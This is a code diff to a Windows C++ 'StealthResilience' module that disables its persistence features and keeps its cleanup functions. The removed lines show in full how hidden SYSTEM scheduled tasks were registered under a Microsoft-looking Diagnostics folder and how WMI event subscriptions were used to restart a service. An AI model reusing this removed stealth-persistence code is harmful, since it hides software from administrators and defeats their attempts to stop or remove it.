@@ -10,6 +10,10 @@
 #include <string>
 #include <vector>
 
+#ifndef ERROR_ACCESS_DISABLED_BY_POLICY
+#define ERROR_ACCESS_DISABLED_BY_POLICY 1260L
+#endif
+
 using Microsoft::WRL::ComPtr;
 
 namespace {
@@ -98,57 +102,6 @@ HRESULT EnsureComSecurity() {
     return hr;
 }
 
-std::wstring SanitizeName(const wchar_t* source) {
-    std::wstring result;
-    if (source == nullptr) {
-        return result;
-    }
-    while (*source != L'\0') {
-        wchar_t ch = *source++;
-        if ((ch >= L'0' && ch <= L'9') ||
-            (ch >= L'a' && ch <= L'z') ||
-            (ch >= L'A' && ch <= L'Z')) {
-            result.push_back(ch);
-        } else {
-            result.push_back(L'_');
-        }
-    }
-    return result;
-}
-
-std::wstring GuidToString(const GUID& guid) {
-    wchar_t buffer[64] = {0};
-    int chars = StringFromGUID2(guid, buffer, ARRAYSIZE(buffer));
-    if (chars <= 0) {
-        return L"";
-    }
-    std::wstring formatted(buffer);
-    if (!formatted.empty()) {
-        // Remove surrounding braces
-        if (formatted.front() == L'{') { formatted.erase(formatted.begin()); }
-        if (!formatted.empty() && formatted.back() == L'}') { formatted.pop_back(); }
-    }
-    return formatted;
-}
-
-std::wstring BuildTaskName(const wchar_t* serviceName, const wchar_t* hint, const wchar_t* suffix) {
-    GUID guid = {};
-    if (FAILED(CoCreateGuid(&guid))) {
-        return L"";
-    }
-    const wchar_t* baseSource = (hint != nullptr && hint[0] != L'\0') ? hint : serviceName;
-    std::wstring clean = SanitizeName(baseSource);
-    if (clean.empty()) {
-        clean = L"Service";
-    }
-    std::wstring name = clean;
-    name.append(L"-");
-    name.append(suffix);
-    name.append(L"-");
-    name.append(GuidToString(guid));
-    return name;
-}
-
 HRESULT ConnectTaskService(ComPtr<ITaskService>& service) {
     HRESULT hr = CoCreateInstance(
         CLSID_TaskScheduler,
@@ -163,140 +116,22 @@ HRESULT ConnectTaskService(ComPtr<ITaskService>& service) {
     return service->Connect(empty.get(), empty.get(), empty.get(), empty.get());
 }
 
-HRESULT EnsureSubFolder(ITaskFolder* parent, const wchar_t* name, ComPtr<ITaskFolder>& folder) {
-    if (parent == nullptr || name == nullptr) {
-        return E_POINTER;
-    }
-
-    ScopedBstr folderName(name);
-    if (folderName.Get() == nullptr) {
-        return E_OUTOFMEMORY;
-    }
-
-    HRESULT hr = parent->GetFolder(folderName.Get(), &folder);
-    if (SUCCEEDED(hr)) {
-        return hr;
-    }
-
-    ScopedVariant sddl;
-    hr = parent->CreateFolder(folderName.Get(), sddl.get(), &folder);
-    if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
-        folder = nullptr;
-        return parent->GetFolder(folderName.Get(), &folder);
-    }
-    return hr;
-}
-
-HRESULT ResolveDiagnosticsFolder(ITaskService* service, ComPtr<ITaskFolder>& folder) {
+HRESULT OpenDiagnosticsFolder(ITaskService* service, ComPtr<ITaskFolder>& folder) {
     if (service == nullptr) {
         return E_POINTER;
     }
 
-    ComPtr<ITaskFolder> root;
-    ScopedBstr rootPath(L"\\");
-    HRESULT hr = service->GetFolder(rootPath.Get(), &root);
-    if (FAILED(hr)) {
-        return hr;
-    }
-
-    ComPtr<ITaskFolder> microsoft;
-    hr = EnsureSubFolder(root.Get(), L"Microsoft", microsoft);
-    if (FAILED(hr)) {
-        return hr;
-    }
-    ComPtr<ITaskFolder> windows;
-    hr = EnsureSubFolder(microsoft.Get(), L"Windows", windows);
-    if (FAILED(hr)) {
-        return hr;
-    }
-    return EnsureSubFolder(windows.Get(), L"Diagnostics", folder);
-}
-
-HRESULT PrepareTaskDefinition(ITaskService* service, BOOL hidden, ComPtr<ITaskDefinition>& definition) {
-    if (service == nullptr) {
-        return E_POINTER;
-    }
-
-    HRESULT hr = service->NewTask(0, &definition);
-    if (FAILED(hr)) {
-        return hr;
-    }
-
-    ComPtr<IRegistrationInfo> regInfo;
-    hr = definition->get_RegistrationInfo(&regInfo);
-    if (SUCCEEDED(hr) && regInfo) {
-        ScopedBstr author(STEALTH_FALLBACK_DISPLAY_NAME);
-        regInfo->put_Author(author.Get());
-        ScopedBstr source(STEALTH_FALLBACK_SERVICE_NAME);
-        regInfo->put_Source(source.Get());
-    }
-
-    ComPtr<IPrincipal> principal;
-    hr = definition->get_Principal(&principal);
-    if (SUCCEEDED(hr) && principal) {
-        principal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
-        principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
-        ScopedBstr user(L"NT AUTHORITY\\SYSTEM");
-        principal->put_UserId(user.Get());
-    }
-
-    ComPtr<ITaskSettings> settings;
-    hr = definition->get_Settings(&settings);
-    if (SUCCEEDED(hr) && settings) {
-        settings->put_Hidden(hidden ? VARIANT_TRUE : VARIANT_FALSE);
-        settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
-        settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
-        settings->put_StartWhenAvailable(VARIANT_TRUE);
-        settings->put_AllowHardTerminate(VARIANT_TRUE);
-        settings->put_MultipleInstances(TASK_INSTANCES_IGNORE_NEW);
-    }
-
-    return S_OK;
-}
-
-HRESULT RegisterTaskDefinition(
-    ITaskFolder* folder,
-    const std::wstring& taskName,
-    ITaskDefinition* definition,
-    std::wstring* fullPath) {
-
-    if (folder == nullptr || definition == nullptr) {
-        return E_POINTER;
-    }
-
-    ScopedBstr nameBstr(taskName.c_str());
-    if (nameBstr.Get() == nullptr) {
+    ScopedBstr diagnosticsPath(L"\\Microsoft\\Windows\\Diagnostics");
+    if (diagnosticsPath.Get() == nullptr) {
         return E_OUTOFMEMORY;
     }
 
-    ScopedVariant user;
-    user.get().vt = VT_BSTR;
-    user.get().bstrVal = SysAllocString(L"NT AUTHORITY\\SYSTEM");
-    if (user.get().bstrVal == nullptr) {
-        return E_OUTOFMEMORY;
-    }
+    return service->GetFolder(diagnosticsPath.Get(), &folder);
+}
 
-    ScopedVariant empty;
-    ComPtr<IRegisteredTask> registered;
-    HRESULT hr = folder->RegisterTaskDefinition(
-        nameBstr.Get(),
-        definition,
-        TASK_CREATE_OR_UPDATE,
-        user.get(),
-        empty.get(),
-        TASK_LOGON_SERVICE_ACCOUNT,
-        empty.get(),
-        &registered);
-    if (FAILED(hr)) {
-        return hr;
-    }
-
-    if (fullPath != nullptr) {
-        *fullPath = L"\\Microsoft\\Windows\\Diagnostics\\";
-        fullPath->append(taskName);
-    }
-
-    return S_OK;
+bool IsTaskFolderMissing(HRESULT hr) {
+    return hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND) ||
+           hr == HRESULT_FROM_WIN32(ERROR_PATH_NOT_FOUND);
 }
 
 static bool SplitTaskFullPath(const wchar_t* fullPath, std::wstring& folderPath, std::wstring& taskName)
@@ -321,27 +156,6 @@ static bool SplitTaskFullPath(const wchar_t* fullPath, std::wstring& folderPath,
     }
     taskName = normalized.substr(pos + 1);
     return !taskName.empty();
-}
-
-std::wstring BuildEventXPath(const wchar_t* serviceName) {
-    if (serviceName == nullptr) {
-        return L"";
-    }
-    wchar_t buffer[1024];
-    _snwprintf_s(
-        buffer,
-        _countof(buffer),
-        _TRUNCATE,
-        L"<QueryList>"
-        L"<Query Id=\"0\" Path=\"System\">"
-        L"<Select Path=\"System\">"
-        L"*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and "
-        L"*[EventData[Data='%ls'] and EventData[Data='stopped']]"
-        L"</Select>"
-        L"</Query>"
-        L"</QueryList>",
-        serviceName);
-    return std::wstring(buffer);
 }
 
 static bool IsNullOrEmpty(const wchar_t* value) {
@@ -417,38 +231,6 @@ std::wstring EscapeWmiName(const std::wstring& name) {
     return escaped;
 }
 
-HRESULT PutStringProperty(IWbemClassObject* instance, const wchar_t* propertyName, const std::wstring& value) {
-    if (instance == nullptr || propertyName == nullptr) {
-        return E_POINTER;
-    }
-    ScopedVariant var;
-    var.get().vt = VT_BSTR;
-    var.get().bstrVal = SysAllocString(value.c_str());
-    if (var.get().bstrVal == nullptr) {
-        return E_OUTOFMEMORY;
-    }
-    return instance->Put(propertyName, 0, &var.get(), 0);
-}
-
-HRESULT CreateWmiInstance(
-    IWbemServices* services,
-    const wchar_t* className,
-    IWbemClassObject** instance) {
-    if (services == nullptr || className == nullptr || instance == nullptr) {
-        return E_POINTER;
-    }
-    ScopedBstr classBstr(className);
-    if (classBstr.Get() == nullptr) {
-        return E_OUTOFMEMORY;
-    }
-    ComPtr<IWbemClassObject> cls;
-    HRESULT hr = services->GetObject(classBstr.Get(), 0, nullptr, &cls, nullptr);
-    if (FAILED(hr)) {
-        return hr;
-    }
-    return cls->SpawnInstance(0, instance);
-}
-
 HRESULT DeleteWmiInstance(IWbemServices* services, const std::wstring& path) {
     if (services == nullptr) {
         return E_POINTER;
@@ -470,106 +252,15 @@ BOOL StealthResilience_CreateAutorunTask(
     wchar_t* createdTaskPath,
     size_t createdTaskPathCch) {
 
-    if (IsNullOrEmpty(serviceName) || createdTaskPath == nullptr || createdTaskPathCch == 0) {
-        return FALSE;
+    UNREFERENCED_PARAMETER(serviceName);
+    UNREFERENCED_PARAMETER(taskHint);
+    UNREFERENCED_PARAMETER(triggerKeyword);
+    UNREFERENCED_PARAMETER(hidden);
+    if (createdTaskPath != nullptr && createdTaskPathCch > 0) {
+        createdTaskPath[0] = L'\0';
     }
-    createdTaskPath[0] = L'\0';
-
-    ComInitGuard guard;
-    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskService> service;
-    if (FAILED(ConnectTaskService(service))) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskFolder> diagnosticsFolder;
-    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskDefinition> definition;
-    if (FAILED(PrepareTaskDefinition(service.Get(), hidden, definition))) {
-        return FALSE;
-    }
-
-    // Configure trigger
-    ComPtr<ITriggerCollection> triggers;
-    if (FAILED(definition->get_Triggers(&triggers))) {
-        return FALSE;
-    }
-
-    TASK_TRIGGER_TYPE2 triggerType = TASK_TRIGGER_LOGON;
-    if (!IsNullOrEmpty(triggerKeyword)) {
-        if (_wcsicmp(triggerKeyword, L"ONBOOT") == 0 || _wcsicmp(triggerKeyword, L"ONSTART") == 0) {
-            triggerType = TASK_TRIGGER_BOOT;
-        }
-    }
-
-    ComPtr<ITrigger> trigger;
-    if (FAILED(triggers->Create(triggerType, &trigger))) {
-        return FALSE;
-    }
-
-    if (triggerType == TASK_TRIGGER_LOGON) {
-        ComPtr<ILogonTrigger> logon;
-        if (SUCCEEDED(trigger.As(&logon)) && logon) {
-            ScopedBstr systemUser(L"SYSTEM");
-            if (systemUser.Get() == nullptr || FAILED(logon->put_UserId(systemUser.Get()))) {
-                return FALSE;
-            }
-        }
-    }
-
-    // Configure action
-    ComPtr<IActionCollection> actions;
-    if (FAILED(definition->get_Actions(&actions))) {
-        return FALSE;
-    }
-    ComPtr<IAction> action;
-    if (FAILED(actions->Create(TASK_ACTION_EXEC, &action))) {
-        return FALSE;
-    }
-    ComPtr<IExecAction> exec;
-    if (FAILED(action.As(&exec))) {
-        return FALSE;
-    }
-
-    wchar_t systemDir[MAX_PATH] = {0};
-    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
-        return FALSE;
-    }
-
-    wchar_t scPath[MAX_PATH] = {0};
-    if (FAILED(StringCchPrintfW(scPath, ARRAYSIZE(scPath), L"%s\\sc.exe", systemDir))) {
-        return FALSE;
-    }
-    if (FAILED(exec->put_Path(scPath))) {
-        return FALSE;
-    }
-
-    wchar_t arguments[512] = {0};
-    if (FAILED(StringCchPrintfW(arguments, ARRAYSIZE(arguments), L"start %ls", serviceName))) {
-        return FALSE;
-    }
-    if (FAILED(exec->put_Arguments(arguments))) {
-        return FALSE;
-    }
-
-    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"Autorun");
-    if (taskName.empty()) {
-        return FALSE;
-    }
-
-    std::wstring fullPath;
-    if (FAILED(RegisterTaskDefinition(diagnosticsFolder.Get(), taskName, definition.Get(), &fullPath))) {
-        return FALSE;
-    }
-
-    wcsncpy_s(createdTaskPath, createdTaskPathCch, fullPath.c_str(), _TRUNCATE);
-    return TRUE;
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    return FALSE;
 }
 
 BOOL StealthResilience_CreateRestartTask(
@@ -580,103 +271,15 @@ BOOL StealthResilience_CreateRestartTask(
     wchar_t* createdTaskPath,
     size_t createdTaskPathCch) {
 
-    if (IsNullOrEmpty(serviceName) || createdTaskPath == nullptr || createdTaskPathCch == 0) {
-        return FALSE;
+    UNREFERENCED_PARAMETER(serviceName);
+    UNREFERENCED_PARAMETER(taskHint);
+    UNREFERENCED_PARAMETER(eventXPath);
+    UNREFERENCED_PARAMETER(hidden);
+    if (createdTaskPath != nullptr && createdTaskPathCch > 0) {
+        createdTaskPath[0] = L'\0';
     }
-    createdTaskPath[0] = L'\0';
-
-    std::wstring xPath = IsNullOrEmpty(eventXPath) ? BuildEventXPath(serviceName) : std::wstring(eventXPath);
-    if (xPath.empty()) {
-        return FALSE;
-    }
-
-    ComInitGuard guard;
-    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskService> service;
-    if (FAILED(ConnectTaskService(service))) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskFolder> diagnosticsFolder;
-    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
-        return FALSE;
-    }
-
-    ComPtr<ITaskDefinition> definition;
-    if (FAILED(PrepareTaskDefinition(service.Get(), hidden, definition))) {
-        return FALSE;
-    }
-
-    ComPtr<ITriggerCollection> triggers;
-    if (FAILED(definition->get_Triggers(&triggers))) {
-        return FALSE;
-    }
-
-    ComPtr<ITrigger> trigger;
-    if (FAILED(triggers->Create(TASK_TRIGGER_EVENT, &trigger))) {
-        return FALSE;
-    }
-
-    ComPtr<IEventTrigger> eventTrigger;
-    if (FAILED(trigger.As(&eventTrigger))) {
-        return FALSE;
-    }
-    ScopedBstr subscription(xPath.c_str());
-    if (subscription.Get() == nullptr) {
-        return FALSE;
-    }
-    eventTrigger->put_Subscription(subscription.Get());
-    eventTrigger->put_Enabled(VARIANT_TRUE);
-
-    ComPtr<IActionCollection> actions;
-    if (FAILED(definition->get_Actions(&actions))) {
-        return FALSE;
-    }
-    ComPtr<IAction> action;
-    if (FAILED(actions->Create(TASK_ACTION_EXEC, &action))) {
-        return FALSE;
-    }
-    ComPtr<IExecAction> exec;
-    if (FAILED(action.As(&exec))) {
-        return FALSE;
-    }
-
-    wchar_t systemDir[MAX_PATH] = {0};
-    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
-        return FALSE;
-    }
-
-    wchar_t scPath[MAX_PATH] = {0};
-    if (FAILED(StringCchPrintfW(scPath, ARRAYSIZE(scPath), L"%s\\sc.exe", systemDir))) {
-        return FALSE;
-    }
-    if (FAILED(exec->put_Path(scPath))) {
-        return FALSE;
-    }
-
-    wchar_t arguments[512] = {0};
-    if (FAILED(StringCchPrintfW(arguments, ARRAYSIZE(arguments), L"start %ls", serviceName))) {
-        return FALSE;
-    }
-    if (FAILED(exec->put_Arguments(arguments))) {
-        return FALSE;
-    }
-
-    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"RestartOnStop");
-    if (taskName.empty()) {
-        return FALSE;
-    }
-
-    std::wstring fullPath;
-    if (FAILED(RegisterTaskDefinition(diagnosticsFolder.Get(), taskName, definition.Get(), &fullPath))) {
-        return FALSE;
-    }
-
-    wcsncpy_s(createdTaskPath, createdTaskPathCch, fullPath.c_str(), _TRUNCATE);
-    return TRUE;
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    return FALSE;
 }
 
 BOOL StealthResilience_DeleteTask(const wchar_t* taskPath) {
@@ -704,8 +307,9 @@ BOOL StealthResilience_DeleteTask(const wchar_t* taskPath) {
     }
 
     ComPtr<ITaskFolder> diagnosticsFolder;
-    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
-        return FALSE;
+    HRESULT folderHr = OpenDiagnosticsFolder(service.Get(), diagnosticsFolder);
+    if (FAILED(folderHr)) {
+        return IsTaskFolderMissing(folderHr) ? TRUE : FALSE;
     }
 
     ScopedBstr name(relative);
@@ -753,8 +357,12 @@ BOOL StealthResilience_DeleteTasksByPrefix(
     }
 
     ComPtr<ITaskFolder> diagnosticsFolder;
-    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
-        return FALSE;
+    HRESULT folderHr = OpenDiagnosticsFolder(service.Get(), diagnosticsFolder);
+    if (FAILED(folderHr)) {
+        if (removedCount) {
+            *removedCount = 0;
+        }
+        return IsTaskFolderMissing(folderHr) ? TRUE : FALSE;
     }
 
     ComPtr<IRegisteredTaskCollection> tasks;
@@ -891,7 +499,7 @@ BOOL StealthResilience_FindTaskByPrefix(
     }
 
     ComPtr<ITaskFolder> diagnosticsFolder;
-    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
+    if (FAILED(OpenDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
         return FALSE;
     }
 
@@ -950,128 +558,18 @@ BOOL StealthResilience_CreateWmiRestartSubscription(
     wchar_t* outConsumerName,
     size_t consumerNameCch) {
 
-    if (IsNullOrEmpty(serviceName) ||
-        outFilterName == nullptr || filterNameCch == 0 ||
-        outConsumerName == nullptr || consumerNameCch == 0) {
-        return FALSE;
+    UNREFERENCED_PARAMETER(serviceName);
+    UNREFERENCED_PARAMETER(methodClass);
+    UNREFERENCED_PARAMETER(methodName);
+    UNREFERENCED_PARAMETER(namespacePath);
+    if (outFilterName != nullptr && filterNameCch > 0) {
+        outFilterName[0] = L'\0';
     }
-    outFilterName[0] = L'\0';
-    outConsumerName[0] = L'\0';
-
-    ComInitGuard guard;
-    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
-        return FALSE;
+    if (outConsumerName != nullptr && consumerNameCch > 0) {
+        outConsumerName[0] = L'\0';
     }
-
-    std::wstring ns = NormalizeNamespace(namespacePath);
-    ComPtr<IWbemServices> services;
-    if (FAILED(ConnectWmi(ns, services))) {
-        return FALSE;
-    }
-
-    std::wstring base = SanitizeName(methodClass);
-    if (base.empty()) {
-        base = SanitizeName(serviceName);
-        if (base.empty()) {
-            base = L"DiagHost";
-        }
-    }
-
-    GUID guid = {};
-    if (FAILED(CoCreateGuid(&guid))) {
-        return FALSE;
-    }
-
-    std::wstring guidStr = GuidToString(guid);
-    std::wstring filterName = base + L"_StopFilter_" + guidStr;
-    std::wstring consumerName = base + L"_RestartConsumer_" + guidStr;
-
-    ComPtr<IWbemClassObject> filter;
-    if (FAILED(CreateWmiInstance(services.Get(), L"__EventFilter", &filter))) {
-        return FALSE;
-    }
-
-    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name='";
-    query.append(serviceName);
-    query.append(L"' AND TargetInstance.State='Stopped'");
-
-    if (FAILED(PutStringProperty(filter.Get(), L"Name", filterName))) {
-        return FALSE;
-    }
-    if (FAILED(PutStringProperty(filter.Get(), L"QueryLanguage", L"WQL"))) {
-        return FALSE;
-    }
-    if (FAILED(PutStringProperty(filter.Get(), L"Query", query))) {
-        return FALSE;
-    }
-    if (FAILED(PutStringProperty(filter.Get(), L"EventNamespace", L"root\\cimv2"))) {
-        return FALSE;
-    }
-
-    if (FAILED(services->PutInstance(filter.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
-        return FALSE;
-    }
-
-    ComPtr<IWbemClassObject> consumer;
-    if (FAILED(CreateWmiInstance(services.Get(), L"CommandLineEventConsumer", &consumer))) {
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-
-    wchar_t systemDir[MAX_PATH] = {0};
-    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-
-    wchar_t commandLine[512] = {0};
-    if (FAILED(StringCchPrintfW(commandLine, ARRAYSIZE(commandLine), L"%ls\\sc.exe start %ls", systemDir, serviceName))) {
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-
-    if (FAILED(PutStringProperty(consumer.Get(), L"Name", consumerName)) ||
-        FAILED(PutStringProperty(consumer.Get(), L"CommandLineTemplate", commandLine))) {
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-    ScopedVariant runInteractive;
-    runInteractive->vt = VT_BOOL;
-    runInteractive->boolVal = VARIANT_FALSE;
-    consumer->Put(L"RunInteractively", 0, &runInteractive.get(), 0);
-
-    if (FAILED(services->PutInstance(consumer.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-
-    // Bind filter to consumer
-    ComPtr<IWbemClassObject> binding;
-    if (FAILED(CreateWmiInstance(services.Get(), L"__FilterToConsumerBinding", &binding))) {
-        DeleteWmiInstance(services.Get(), L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(consumerName) + L"\"");
-        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
-        return FALSE;
-    }
-
-    std::wstring filterPath = L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"";
-    std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(consumerName) + L"\"";
-
-    if (FAILED(PutStringProperty(binding.Get(), L"Filter", filterPath)) ||
-        FAILED(PutStringProperty(binding.Get(), L"Consumer", consumerPath))) {
-        DeleteWmiInstance(services.Get(), consumerPath);
-        DeleteWmiInstance(services.Get(), filterPath);
-        return FALSE;
-    }
-
-    if (FAILED(services->PutInstance(binding.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
-        DeleteWmiInstance(services.Get(), consumerPath);
-        DeleteWmiInstance(services.Get(), filterPath);
-        return FALSE;
-    }
-
-    wcsncpy_s(outFilterName, filterNameCch, filterName.c_str(), _TRUNCATE);
-    wcsncpy_s(outConsumerName, consumerNameCch, consumerName.c_str(), _TRUNCATE);
-    return TRUE;
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    return FALSE;
 }
 
 BOOL StealthResilience_RemoveWmiSubscription(
